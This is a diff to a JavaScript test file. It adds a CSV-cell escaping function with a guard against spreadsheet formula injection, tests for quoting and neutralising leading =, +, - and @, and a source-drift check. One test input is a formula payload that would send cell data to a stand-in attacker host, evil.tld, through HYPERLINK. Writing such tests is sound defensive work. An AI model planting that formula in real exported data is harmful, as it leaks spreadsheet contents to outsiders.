@@ -463,6 +463,59 @@ describe('escHtml — XSS sanitization', () => {
     });
 });
 
+// ---- csvCell (copy of js/admin/admin-core.js) ----
+function csvCell(val) {
+    let str = String(val ?? '');
+    if (/^[=+\-@\t\r]/.test(str)) str = `'${str}`;
+    return str.includes(',') || str.includes('"') || str.includes('\n')
+        ? `"${str.replace(/"/g, '""')}"` : str;
+}
+
+describe('csvCell — RFC 4180 quoting + formula-injection guard', () => {
+    test('plain text passes through', () => {
+        expect(csvCell('Alice Smith')).toBe('Alice Smith');
+    });
+    test('comma forces quoting', () => {
+        expect(csvCell('Smith, Alice')).toBe('"Smith, Alice"');
+    });
+    test('embedded quote is doubled', () => {
+        expect(csvCell('the "Bear" room')).toBe('"the ""Bear"" room"');
+    });
+    test('newline forces quoting', () => {
+        expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
+    });
+    test('null/undefined → empty string', () => {
+        expect(csvCell(null)).toBe('');
+        expect(csvCell(undefined)).toBe('');
+    });
+    test('number is stringified', () => {
+        expect(csvCell(42)).toBe('42');
+    });
+
+    // R17 — a parent-supplied name starting with =, +, - or @ executes when the
+    // export is opened in Excel/Sheets. The apostrophe forces text, and is not
+    // displayed by the spreadsheet.
+    test('leading = is neutralised', () => {
+        expect(csvCell('=HYPERLINK("http://evil.tld?"&A1)'))
+            .toBe('"\'=HYPERLINK(""http://evil.tld?""&A1)"');
+    });
+    test('leading + is neutralised', () => {
+        expect(csvCell('+1234')).toBe("'+1234");
+    });
+    test('leading - is neutralised', () => {
+        expect(csvCell('-1+1')).toBe("'-1+1");
+    });
+    test('leading @ is neutralised', () => {
+        expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
+    });
+    test('a hyphen mid-string is left alone', () => {
+        expect(csvCell('Mary-Jane')).toBe('Mary-Jane');
+    });
+    test('phone number keeps its leading plus escaped, still one field', () => {
+        expect(csvCell('+1 (314) 555-0100')).toBe("'+1 (314) 555-0100");
+    });
+});
+
 // ============================================================
 // SOURCE-DRIFT GUARD
 // ------------------------------------------------------------
@@ -518,6 +571,7 @@ describe('source-drift guard — copies must match js/ source', () => {
         ['getRoomIdFromDob',   'js/supabase.js'],
         ['effectiveRate',      'js/app.js'],
         ['getWeekMonday',      'js/app.js'],
+        ['csvCell',            'js/admin/admin-core.js'],
     ];
 
     for (const [fnName, relPath] of GUARDED) {
